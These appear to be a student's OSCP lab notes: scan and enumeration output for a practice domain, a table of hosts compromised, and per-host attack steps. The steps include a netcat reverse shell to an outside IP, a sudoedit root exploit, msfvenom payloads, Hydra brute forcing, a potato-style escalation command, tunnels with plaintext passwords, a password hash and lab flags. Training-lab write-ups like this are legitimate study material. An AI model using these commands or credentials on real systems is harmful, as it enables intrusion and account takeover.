NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:93:7c:86 (VMware)<br />| smb-os-discovery: <br />|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)<br />|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1<br />|   Computer name: master<br />|   NetBIOS computer name: MASTER\x00<br />|   Domain name: thinc.local<br />|   Forest name: thinc.local<br />|   FQDN: master.thinc.local<br />|_  System time: 2013-12-27T23:37:48-08:00<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: required<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled and required<br />| smb2-time: <br />|   date: 2013-12-28 02:37:47<br />|_  start_date: 2013-12-28 10:54:35<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 501.74 seconds<br />root@kali:~/Desktop/Machines/OSCP/220# <br /></div><div class='page'><h1 class='title level-6'>smb nmap</h1><br/>Host script results:<br />|_smb-vuln-ms10-054: false<br />|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED<br />|_smb-vuln-ms17-010: This system is patched.<br /><br /></div><div class='page'><h1 class='title level-6'>enum4linux</h1><br/>enum4linux -a 10.11.1.220 | tee e4lresults.txt<br />Starting enum4linux v0.8.9 ( <a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a> ) on Wed Dec  4 16:27:18 2019<br /><br /> ========================== <br />|    Target Information    |<br /> ========================== <br />Target ........... 10.11.1.220<br />RID Range ........ 500-550,1000-1050<br />Username ......... &#39;&#39;<br />Password ......... &#39;&#39;<br />Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none<br /><br /><br /> =================================================== <br />|    Enumerating Workgroup/Domain on 10.11.1.220    |<br /> =================================================== <br />[+] Got domain/workgroup name: THINC<br /><br /> =========================================== <br />|    Nbtstat Information for 10.11.1.220    |<br /> =========================================== <br />Looking up status of 10.11.1.220<br />	MASTER          &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service<br />	THINC           &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name<br />	THINC           &lt;1c&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain Controllers<br />	MASTER          &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service<br />	THINC           &lt;1b&gt; -         B &lt;ACTIVE&gt;  Domain Master Browser<br /><br />	MAC Address = 00-50-56-93-7C-86<br /><br /> ==================================== <br />|    Session Check on 10.11.1.220    |<br /> ==================================== <br />[+] Server 10.11.1.220 allows sessions using username &#39;&#39;, password &#39;&#39;<br /><br /> ========================================== <br />|    Getting domain SID for 10.11.1.220    |<br /> ========================================== <br />Domain Name: THINC<br />Domain Sid: S-1-5-21-279202750-2644721835-2190734642<br />[+] Host is part of a domain (not a workgroup)<br /><br /> ===================================== <br />|    OS information on 10.11.1.220    |<br /> ===================================== <br />Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.<br />[+] Got OS info for 10.11.1.220 from smbclient: <br />[+] Got OS info for 10.11.1.220 from srvinfo:<br />Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED<br /><br /> ============================ <br />|    Users on 10.11.1.220    |<br /> ============================ <br />[E] Couldn&#39;t find users using querydispinfo: NT_STATUS_ACCESS_DENIED<br /><br />[E] Couldn&#39;t find users using enumdomusers: NT_STATUS_ACCESS_DENIED<br /><br /> ======================================== <br />|    Share Enumeration on 10.11.1.220    |<br /> ======================================== <br />WARNING: The &quot;syslog&quot; option is deprecated<br />smb1cli_req_writev_submit: called for dialect[SMB2_10] server[10.11.1.220]<br /><br />	Sharename       Type      Comment<br />	---------       ----      -------<br />Error returning browse list: NT_STATUS_REVISION_MISMATCH<br />Reconnecting with SMB1 for workgroup listing.<br />Connection to 10.11.1.220 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)<br />Failed to connect with SMB1 -- no workgroup available<br /><br />[+] Attempting to map shares on 10.11.1.220<br /><br /> =================================================== <br />|    Password Policy Information for 10.11.1.220    |<br /> =================================================== <br />[E] Unexpected error from polenum:<br /><br /><br />[+] Attaching to 10.11.1.220 using a NULL share<br /><br />[+] Trying protocol 445/SMB...<br /><br />	[!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.<br /><br />[+] Trying protocol 139/SMB...<br /><br />	[!] Protocol failed: Cannot request session (Called Name:10.11.1.220)<br /><br /><br />[E] Failed to get password policy with rpcclient<br /><br /><br /> ============================= <br />|    Groups on 10.11.1.220    |<br /> ============================= <br /><br />[+] Getting builtin groups:<br /><br />[+] Getting builtin group memberships:<br /><br />[+] Getting local groups:<br /><br />[+] Getting local group memberships:<br /><br />[+] Getting domain groups:<br /><br />[+] Getting domain group memberships:<br /><br /> ====================================================================== <br />|    Users on 10.11.1.220 via RID cycling (RIDS: 500-550,1000-1050)    |<br /> ====================================================================== <br />[E] Couldn&#39;t get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.<br /><br /> ============================================ <br />|    Getting printer info for 10.11.1.220    |<br /> ============================================ <br />Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED<br /><br /><br />enum4linux complete on Wed Dec  4 16:27:30 2019<br /><br />root@kali:~/Desktop/Machines/OSCP/220# <br /></div><div class='page'><h1 class='title level-6'>nmap kerberos</h1><br/>root@kali:~/Desktop/Machines/OSCP/220# nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=&#39;thinc.local&#39;,userdb=/usr/share/seclists/Usernames/Names/names.txt 10.11.1.220<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-12-04 17:50 EST<br />Nmap scan report for master.thinc.local (10.11.1.220)<br />Host is up (0.045s latency).<br /><br />PORT   STATE SERVICE<br />88/tcp open  kerberos-sec<br />| krb5-enum-users: <br />| Discovered Kerberos principals<br />|     robert@thinc.local<br />|_    kevin@thinc.local<br />MAC Address: 00:50:56:93:7C:86 (VMware)<br /><br />Nmap done: 1 IP address (1 host up) scanned in 91.61 seconds<br />root@kali:~/Desktop/Machines/OSCP/220# <br /></div><div class='page'><h1 class='title level-6'>nmap ldap</h1><br/>root@kali:~/Desktop/Machines/OSCP/220# nmap -p 3268,389,636,3269 --script ldap* 10.11.1.220<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-12-04 18:31 EST<br />Nmap scan report for master.thinc.local (10.11.1.220)<br />Host is up (0.045s latency).<br /><br />PORT     STATE SERVICE<br />389/tcp  open  ldap<br />|_ldap-brute: ERROR: Script execution failed (use -d to debug)<br />| ldap-rootdse: <br />| LDAP Results<br />|   &lt;ROOT&gt;<br />|       currentTime: 20131228073755.0Z<br />|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=thinc,DC=local<br />|       dsServiceName: CN=NTDS Settings,CN=MASTER,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=thinc,DC=local<br />|       namingContexts: DC=thinc,DC=local<br />|       namingContexts: CN=Configuration,DC=thinc,DC=local<br />|       namingContexts: CN=Schema,CN=Configuration,DC=thinc,DC=local<br />|       namingContexts: DC=DomainDnsZones,DC=thinc,DC=local<br />|       namingContexts: DC=ForestDnsZones,DC=thinc,DC=local<br />|       defaultNamingContext: DC=thinc,DC=local<br />|       schemaNamingContext: CN=Schema,CN=Configuration,DC=thinc,DC=local<br />|       configurationNamingContext: CN=Configuration,DC=thinc,DC=local<br />|       rootDomainNamingContext: DC=thinc,DC=local<br />|       supportedControl: 1.2.840.113556.1.4.319<br />|       supportedControl: 1.2.840.113556.1.4.801<br />|       supportedControl: 1.2.840.113556.1.4.473<br />|       supportedControl: 1.2.840.113556.1.4.528<br />|       supportedControl: 1.2.840.113556.1.4.417<br />|       supportedControl: 1.2.840.113556.1.4.619<br />|       supportedControl: 1.2.840.113556.1.4.841<br />|       supportedControl: 1.2.840.113556.1.4.529<br />|       supportedControl: 1.2.840.113556.1.4.805<br />|       supportedControl: 1.2.840.113556.1.4.521<br />|       supportedControl: 1.2.840.113556.1.4.970<br />|       supportedControl: 1.2.840.113556.1.4.1338<br />|       supportedControl: 1.2.840.113556.1.4.474<br />|       supportedControl: 1.2.840.113556.1.4.1339<br />|       supportedControl: 1.2.840.113556.1.4.1340<br />|       supportedControl: 1.2.840.113556.1.4.1413<br />|       supportedControl: 2.16.840.1.113730.3.4.9<br />|       supportedControl: 2.16.840.1.113730.3.4.10<br />|       supportedControl: 1.2.840.113556.1.4.1504<br />|       supportedControl: 1.2.840.113556.1.4.1852<br />|       supportedControl: 1.2.840.113556.1.4.802<br />|       supportedControl: 1.2.840.113556.1.4.1907<br />|       supportedControl: 1.2.840.113556.1.4.1948<br />|       supportedControl: 1.2.840.113556.1.4.1974<br />|       supportedControl: 1.2.840.113556.1.4.1341<br />|       supportedControl: 1.2.840.113556.1.4.2026<br />|       supportedControl: 1.2.840.113556.1.4.2064<br />|       supportedControl: 1.2.840.113556.1.4.2065<br />|       supportedControl: 1.2.840.113556.1.4.2066<br />|       supportedLDAPVersion: 3<br />|       supportedLDAPVersion: 2<br />|       supportedLDAPPolicies: MaxPoolThreads<br />|       supportedLDAPPolicies: MaxDatagramRecv<br />|       supportedLDAPPolicies: MaxReceiveBuffer<br />|       supportedLDAPPolicies: InitRecvTimeout<br />|       supportedLDAPPolicies: MaxConnections<br />|       supportedLDAPPolicies: MaxConnIdleTime<br />|       supportedLDAPPolicies: MaxPageSize<br />|       supportedLDAPPolicies: MaxQueryDuration<br />|       supportedLDAPPolicies: MaxTempTableSize<br />|       supportedLDAPPolicies: MaxResultSetSize<br />|       supportedLDAPPolicies: MinResultSets<br />|       supportedLDAPPolicies: MaxResultSetsPerConn<br />|       supportedLDAPPolicies: MaxNotificationPerConn<br />|       supportedLDAPPolicies: MaxValRange<br />|       supportedLDAPPolicies: ThreadMemoryLimit<br />|       supportedLDAPPolicies: SystemMemoryLimitPercent<br />|       highestCommittedUSN: 270075<br />|       supportedSASLMechanisms: GSSAPI<br />|       supportedSASLMechanisms: GSS-SPNEGO<br />|       supportedSASLMechanisms: EXTERNAL<br />|       supportedSASLMechanisms: DIGEST-MD5<br />|       dnsHostName: master.thinc.local<br />|       ldapServiceName: thinc.local:master$@THINC.LOCAL<br />|       serverName: CN=MASTER,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=thinc,DC=local<br />|       supportedCapabilities: 1.2.840.113556.1.4.800<br />|       supportedCapabilities: 1.2.840.113556.1.4.1670<br />|       supportedCapabilities: 1.2.840.113556.1.4.1791<br />|       supportedCapabilities: 1.2.840.113556.1.4.1935<br />|       supportedCapabilities: 1.2.840.113556.1.4.2080<br />|       isSynchronized: TRUE<br />|       isGlobalCatalogReady: TRUE<br />|       domainFunctionality: 3<br />|       forestFunctionality: 3<br />|_      domainControllerFunctionality: 4<br />636/tcp  open  ldapssl<br />3268/tcp open  globalcatLDAP<br />3269/tcp open  globalcatLDAPssl<br />MAC Address: 00:50:56:93:7C:86 (VMware)<br />Service Info: Host: MASTER; OS: Windows 2008 R2<br /><br />Nmap done: 1 IP address (1 host up) scanned in 364.57 seconds<br /></div><div class='page'><h1 class='title level-5'>DNS dump</h1><br/>root@kali:~/Desktop/Machines/OSCP/220# dnsrecon -r 10.11.1.0/24 -n 10.11.1.220<br />[*] Reverse Look-up of a Range<br />[*] Performing Reverse Lookup from 10.11.1.0 to 10.11.1.255<br />[*] 	 PTR pedro.thinc.local 10.11.1.7<br />[*] 	 PTR alice.thinc.local 10.11.1.5<br />[*] 	 PTR phoenix.thinc.local 10.11.1.8<br />[*] 	 PTR mike.thinc.local 10.11.1.10<br />[*] 	 PTR bob.thinc.local 10.11.1.13<br />[*] 	 PTR bob2.thinc.local 10.11.1.14<br />[*] 	 PTR barry.thinc.local 10.11.1.22<br />[*] 	 PTR payday.thinc.local 10.11.1.24<br />[*] 	 PTR ralph.thinc.local 10.11.1.31<br />[*] 	 PTR leftturn.thinc.local 10.11.1.39<br />[*] 	 PTR pain.thinc.local 10.11.1.35<br />[*] 	 PTR bethany.thinc.local 10.11.1.49<br />[*] 	 PTR 314159265.thinc.local 10.11.1.44<br />[*] 	 PTR bethany2.thinc.local 10.11.1.50<br />[*] 	 PTR alpha.thinc.local 10.11.1.71<br />[*] 	 PTR beta.thinc.local 10.11.1.72<br />[*] 	 PTR bruce.thinc.local 10.11.1.75<br />[*] 	 PTR gamma.thinc.local 10.11.1.73<br />[*] 	 PTR dotty.thinc.local 10.11.1.116<br />[*] 	 PTR tophat.acme.local 10.11.1.115<br />[*] 	 PTR dj.acme.local 10.11.1.128<br />[*] 	 PTR sherlock.thinc.local 10.11.1.125<br />[*] 	 PTR gh0st.thinc.local 10.11.1.133<br />[*] 	 PTR sufferance.thinc.local 10.11.1.136<br />[*] 	 PTR fc4.thinc.local 10.11.1.141<br />[*] 	 PTR helpdesk.thinc.local 10.11.1.145<br />[*] 	 PTR susie.thinc.local 10.11.1.146<br />[*] 	 PTR tears.thinc.local 10.11.1.173<br />[*] 	 PTR oracle.acme.local 10.11.1.202<br />[*] 	 PTR kraken.thinc.local 10.11.1.209<br />[*] 	 PTR hotline.thinc.local 10.11.1.217<br />[*] 	 PTR edbmachine.thinc.local 10.11.1.219<br />[*] 	 PTR observer.thinc.local 10.11.1.218<br />[*] 	 PTR master.thinc.local 10.11.1.220<br />[*] 	 PTR slave.thinc.local 10.11.1.221<br />[*] 	 PTR jeff.thinc.local 10.11.1.223<br />[*] 	 PTR joe.thinc.local 10.11.1.226<br />[*] 	 PTR mail.thinc.local 10.11.1.229<br />[*] 	 PTR jd.acme.local 10.11.1.227<br />[*] 	 PTR kevin.thinc.local 10.11.1.230<br />[*] 	 PTR core.thinc.local 10.11.1.234<br />[*] 	 PTR humble2.thinc.local 10.11.1.238<br />[*] 	 PTR humble.thinc.local 10.11.1.237<br />[*] 	 PTR fw_it.thinc.local 10.11.1.251<br />[*] 	 PTR cory.thinc.local 10.11.1.247<br />[*] 	 PTR fw_dev.thinc.local 10.11.1.252<br />[*] 	 PTR tricia.acme.local 10.11.1.253<br />[+] 47 Records Found<br />root@kali:~/Desktop/Machines/OSCP/220# <br /></div><div class='page'><h1 class='title level-1'>OSCP</h1><br/><br /><table class="table"><tr><th>IP</th><th>Name</th><th>Status</th><th>Technique</th></tr><tr><td>10.11.1.5</td><td>Alice</td><td>Rooted</td><td>SMBv1 Exposed. MS08-067 with SVSVC Bind Shell. (Super Finicky)</td></tr><tr><td>10.11.1.7</td><td>Pedro</td><td>Stuck</td><td>RDP exposed. It appears I will need creds. Maybe after the svcorp domian is owned?</td></tr><tr><td>10.11.1.8</td><td>Phoenix</td><td>Rooted</td><td>Advanced Comment System RFI Got User Shell. Kernel exploit 9542.c to root.</td></tr><tr><td>10.11.1.10</td><td>Mike</td><td>Rooted</td><td>Cold Fusion Directory Traversal exploit for user creds. Schtask to Shell as nt authority system. </td></tr><tr><td>10.11.1.13</td><td>Disco</td><td>Rooted</td><td>Misconfigured FTP server and Web server on Weird port to User. JuicyPotato to nt authority system.</td></tr><tr><td>10.11.1.14</td><td>Bob</td><td>Rooted</td><td>Misconfigured FTP server and Web server to User. Service misconfigutration (upnphost) to root.</td></tr><tr><td>10.11.1.20</td><td>SV-DC01</td><td>Rooted</td><td>psexec via a password reuse and mimikatz dump (from .21)</td></tr><tr><td>10.11.1.21</td><td>SV-FILE01</td><td>Rooted</td><td>psexec via a password reuse and mimikatz dump (from .22)</td></tr><tr><td>10.11.1.22</td><td>SV-Clientx</td><td>Rooted</td><td>Client side execution of a .docm file, placed on the .21 ftp server. Akagi 23 to high integrity shell. Mimikatz dump for the rest of the domain. Spray-Passwords for creds.</td></tr><tr><td>10.11.1.24</td><td>SV-Clientx</td><td>Rooted</td><td>RDP with creds from .22 in workstation_admins group.</td></tr><tr><td>10.11.1.31</td><td>Ralph</td><td>Rooted</td><td>MSSql Misconfiguation allowing execution as NT Authority system. Pivot into IT dept.</td></tr><tr><td>10.1.1.1(10.3.3.88)</td><td>Luigi</td><td>Rooted</td><td>Ruby dev shell vulnerability (with burp). sudo 1.7 sudoedit exploit to root. Pivot into Admin dept.</td></tr><tr><td>10.1.1.27</td><td>Megan</td><td>Rooted</td><td>Directory browseing vuln to get username. SSH brute force to user. NFS root squashing to root.</td></tr><tr><td>10.11.1.251</td><td>Sean</td><td>Rooted</td><td>Brute force to get wp creds admin:monkey. Password reuse, ssh sean:monkey. sudo misconfiguration to root.</td></tr><tr><td>10.1.1.65</td><td>Freddy</td><td>Rooted</td><td>Pop3 Buffer Overflow on weird port.</td></tr><tr><td>10.1.1.68</td><td>Chimera</td><td>Rooted</td><td>SMB misconfiguration for username. Brute force FTP for Password. PrintSpoofer.exe to root.</td></tr><tr><td> </td><td> </td><td> </td><td> </td></tr><tr><td> </td><td> </td><td> </td><td> </td></tr><tr><td> </td><td> </td><td> </td><td> </td></tr></table><br /><br /><br />Tunnels:<br /><br />Public to IT:<br />ssh -p 22 squid@10.11.1.31 -L127.0.0.1:0122:10.1.1.1:22<br />squid:Fr33d0M<br /><br />IT to Admin:<br />ssh -p 1022 root@127.0.0.1 -D 127.0.0.1:9050<br />root:Fr33d0M</div><div class='page'><h1 class='title level-2'>10.1.1.1 Luigi</h1><br/>POST /cmd.php HTTP/1.1<br />Host: 10.1.1.1<br />X-Forwarded-For: 10.3.3.88<br />Accept: application/vnd.web-console.v2<br />X-Requested-With: <br />User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0<br />Accept-Language: en-US,en;q=0.5<br />Accept-Encoding: gzip, deflate<br />Content-Type: application/x-www-form-urlencoded<br />Content-Length: 11<br />Origin: 10.3.3.88<br />Connection: close<br />Referer: 10.3.3.88<br /><br />data=whoami<br /><br /><br /><br /><br /><br />nc 192.168.119.132 8080 -e /bin/bash<br />nc -nlvp<br /><br /><br /><br />cd /tmp<br />cat &gt; sudoedit &lt;&lt; _EOF<br />#!/bin/sh<br />echo ALEX-ALEX<br />su<br />/bin/su<br />/usr/bin/su<br />_EOF<br />chmod a+x ./sudoedit<br />sudo ./sudoedit <a href="file:///etc/apache2/apache2.conf">/etc/apache2/apache2.conf</a><br />whoami<br />	root<br />	<br />	<br />	<br /><a href="https://www.exploit-db.com/exploits/11651">https://www.exploit-db.com/exploits/11651</a><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-3'>Enumeration</h1><br/>POST /cmd.php HTTP/1.1<br />Host: 10.1.1.1<br />X-Forwarded-For: 10.3.3.88<br />Accept: application/vnd.web-console.v2<br />X-Requested-With: <br />User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0<br />Accept-Language: en-US,en;q=0.5<br />Accept-Encoding: gzip, deflate<br />Content-Type: application/x-www-form-urlencoded<br />Content-Length: 11<br />Origin: 10.3.3.88<br />Connection: close<br />Referer: 10.3.3.88<br /><br />data=whoami<br /><br /><br /><br /><br /><br /><br />set up your rce to run : ping -c 1 &lt;attacker ip&gt;<br />running on your attack box: tcpdump -i tun0 icmp <br /><br /><br /><br />luigi:$6$VN6hNJ8F$axUIyZbu14NxQ0BVi/F8gzW6MeRS/0xHzr8Jm8/9z.yyuUK5OiPJw.e88yBTKOYLiZkPx2..eFHhn3OvglLxd.:16912:0:99999:7:::<br /></div><div class='page'><h1 class='title level-3'>Pictures</h1><br/>network-secret.txt<br />56191361c7a9fe24bd71f8c2ee0e5e46<br />proof.txt<br />2938dbc545aa24c8e4f88531d5c2cb28<br /><br /><a href=""><img src="images/1857-1.png" alt="images/1857-1.png" /></a></div><div class='page'><h1 class='title level-2'>10.1.1.27 Megan</h1><br/>PHP dir browsing exploit to show /etc/passwd via web browser (megan is the found username).<br />SSH brute force with Hydra for user shell as megan. megan:replicate<br />cat /etc/exports shows that NFS root squashing is possible. The below article explains how I did it and became root!<br /><br /><a href="https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/privilege-escalation/linux/linux-examples.rst">https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/privilege-escalation/linux/linux-examples.rst</a></div><div class='page'><h1 class='title level-3'>Enumeration</h1><br/>Nmap scan report for 10.1.1.27<br />Host is up (7.7s latency).<br />Not shown: 995 closed ports<br />PORT     STATE SERVICE<br />21/tcp   open  ftp<br />22/tcp   open  ssh<br />80/tcp   open  http<br />111/tcp  open  rpcbind<br />2049/tcp open  nfs<br /><br /><br /><code>megan</code>:replicate<br /><br /><br /><br /><br /><br /><br /><br />history | grep -i mount<br /><br />ram count<br /><br /><br /><br /><br />libnfs<br /><br />NFS root squashing<br /></div><div class='page'><h1 class='title level-3'>Pictures</h1><br/></div><div class='page'><h1 class='title level-2'>10.1.1.65 Freddy</h1><br/>msfvenom -p windows/shell_reverse_tcp lport=8000 lhost=10.1.1.246 -b &#39;\x00\xd9&#39; -f python<br /><br />47554.py		<br />Win10 MailCarrier 2.51 - &#39;POP3 User&#39; Remote Buffer Overflow<br />HAD to <br />	use windows/shell_reverse_tcp<br />	Change buffer length (due to the source ip address length)<br />	change target IP<br />	change target port (2110)<br />	<br />	<br />On sean: nc -nlvp 8000 (also kick off exploit from sean)<br />	<br />	<br /><a href="https://www.exploit-db.com/exploits/47554">https://www.exploit-db.com/exploits/47554</a></div><div class='page'><h1 class='title level-3'>Enumeration</h1><br/>Windows 10.0 Build 18362 (name:FREDDY) (domain:freddy) x86<br />IIS 10.0<br /><br />index.html</div><div class='page'><h1 class='title level-3'>Pictures</h1><br/>50ee46930d1a786bfd03b7002e10ccbf<br /><br /><a href=""><img src="images/1874-1.png" alt="images/1874-1.png" /></a></div><div class='page'><h1 class='title level-2'>10.1.1.68 Chimera</h1><br/>proxychains nmap -sT -Pn --script=smb-enum-users.nse 10.1.1.68								= steph<br />proxychains hydra -t 1 -l steph -P /usr/share/wordlists/rockyou.txt -vV 10.1.1.68 ftp		= billabong<br />proxychains ftp 10.1.1.68																								= smartstore build files<br />grep -ir &#39;User Id&#39;	(part of a mssql connection string)													= sa:CrimsonQuiltScalp193<br />whoami /groups IeImpersonate Token	+ PrintSpoofer.exe												= root</div><div class='page'><h1 class='title level-3'>Enumeration</h1><br/>By Jayashree Pakhare (buzzle.com)<br />Gaynor Borade (buzzle.com)<br /><br /><br />Windows 10 Pro 18363 x64 (name:CHIMERA) (domain:chimera) (signing:False) (SMBv1:True)<br /><br /><br /><br />proxychains nmap -sT -Pn --script=smb-enum-users.nse 10.1.1.68<br />steph<br />steph:billabong<br /><br /><br />sa:CrimsonQuiltScalp193<br /><br /><br /><br />c:\users\steph\jp.exe -l 1337 -p C:\users\steph\443-246.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}<br /></div><div class='page'><h1 class='title level-3'>Pictures</h1><br/></div><div class='page'><h1 class='title level-2'>10.3.3.254</h1><br/></div><div class='page'><h1 class='title level-3'>Enumeration</h1><br/></div><div class='page'><h1 class='title level-3'>Pictures</h1><br/></div><div class='page'><h1 class='title level-2'>10.11.1.5 ALICE</h1><br/>Could not get ms10-017 to work, ms-08-067 was successfull in metasploit when I used a bind shell and changed the SMBPIPE to SRVSVC.</div><div class='page'><h1 class='title level-3'>enumeration</h1><br/>domain THINC<br />x86</div><div class='page'><h1 class='title level-4'>nmap</h1><br/>nmap -Pn 10.11.1.5 &amp;&amp; nmap -sC -sV -Pn 10.11.1.5 &amp;&amp; nmap -p- -Pn 10.11.1.5<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-26 07:48 EDT<br />Nmap scan report for 10.11.1.5<br />Host is up (0.060s latency).<br />Not shown: 997 closed ports<br />PORT    STATE SERVICE<br />135/tcp open  msrpc<br />139/tcp open  netbios-ssn<br />445/tcp open  microsoft-ds<br /><br />Nmap done: 1 IP address (1 host up) scanned in 7.85 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-26 07:48 EDT<br />Nmap scan report for 10.11.1.5<br />Host is up (0.073s latency).<br />Not shown: 997 closed ports<br />PORT    STATE SERVICE      VERSION<br />135/tcp open  msrpc        Microsoft Windows RPC<br />139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn<br />445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds<br />Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp<br /><br />Host script results:<br />|_clock-skew: -1m21s<br />|_nbstat: NetBIOS name: ALICE, NetBIOS user: HACKER, NetBIOS MAC: 00:50:56:9f:f5:61 (VMware)<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />|_smb2-time: Protocol negotiation failed (SMB2)<br /><br />Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />Nmap done: 1 IP address (1 host up) scanned in 19.94 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-26 07:49 EDT<br />Nmap scan report for 10.11.1.5<br />Host is up (0.095s latency).<br />Not shown: 65532 closed ports<br />PORT    STATE SERVICE<br />135/tcp open  msrpc<br />139/tcp open  netbios-ssn<br />445/tcp open  microsoft-ds<br /><br />Nmap done: 1 IP address (1 host up) scanned in 77.01 seconds<br /></div><div class='page'><h1 class='title level-4'>smb</h1><br/></div><div class='page'><h1 class='title level-5'>smb nmap</h1><br/>nmap --script smb-vuln* -p 139,445 10.11.1.5<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-26 07:48 EDT<br />Nmap scan report for 10.11.1.5<br />Host is up (0.097s latency).<br /><br />PORT    STATE SERVICE<br />139/tcp open  netbios-ssn<br />445/tcp open  microsoft-ds<br /><br />Host script results:<br />|_smb-vuln-ms10-054: false<br />|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND<br />| smb-vuln-ms17-010: <br />|   VULNERABLE:<br />|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)<br />|     State: VULNERABLE<br />|     IDs:  CVE:CVE-2017-0143<br />|     Risk factor: HIGH<br />|       A critical remote code execution vulnerability exists in Microsoft SMBv1<br />|        servers (ms17-010).<br />|           <br />|     Disclosure date: 2017-03-14<br />|     References:<br />|       <a href="https://technet.microsoft.com/en-us/library/security/ms17-010.aspx">https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</a><br />|       <a href="https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/">https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</a><br />|_      <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</a><br /><br />Nmap done: 1 IP address (1 host up) scanned in 21.11 seconds<br />squid@CoolHandKali:/Yeet/Machines/OSCP$ <br /></div><div class='page'><h1 class='title level-5'>enum4linux</h1><br/>enum4linux -a 10.11.1.5<br />Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Apr 26 07:48:49 2020<br /><br /> ========================== <br />|    Target Information    |<br /> ========================== <br />Target ........... 10.11.1.5<br />RID Range ........ 500-550,1000-1050<br />Username ......... &#39;&#39;<br />Password ......... &#39;&#39;<br />Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none<br /><br /><br /> ================================================= <br />|    Enumerating Workgroup/Domain on 10.11.1.5    |<br /> ================================================= <br />[+] Got domain/workgroup name: THINC<br /><br /> ========================================= <br />|    Nbtstat Information for 10.11.1.5    |<br /> ========================================= <br />Looking up status of 10.11.1.5<br />	ALICE           &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service<br />	ALICE           &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service<br />	THINC           &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name<br />	ALICE           &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service<br />	THINC           &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections<br />	THINC           &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser<br />	..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser<br />	HACKER          &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service<br /><br />	MAC Address = 00-50-56-9F-F5-61<br /><br /> ================================== <br />|    Session Check on 10.11.1.5    |<br /> ================================== <br />[E] Server doesn&#39;t allow session using username &#39;&#39;, password &#39;&#39;.  Aborting remainder of tests.<br /></div><div class='page'><h1 class='title level-3'>pictures</h1><br/><a href=""><img src="images/887-1.png" alt="images/887-1.png" /></a></div><div class='page'><h1 class='title level-4'>smb vuln nmap</h1><br/><a href=""><img src="images/888-1.png" alt="images/888-1.png" /></a><br /><br /><a href=""><img src="images/888-2.png" alt="images/888-2.png" /></a><br /><a href=""><img src="images/888-3.png" alt="images/888-3.png" /></a></div><div class='page'><h1 class='title level-4'>proof</h1><br/><a href=""><img src="images/889-1.png" alt="images/889-1.png" /></a><br />ed20b785808f615be2c588ed925b18ce</div><div class='page'><h1 class='title level-2'>10.11.1.7 Pedro</h1><br/></div><div class='page'><h1 class='title level-3'>Enumeration</h1><br/></div><div class='page'><h1 class='title level-3'>Pictures</h1><br/></div><div 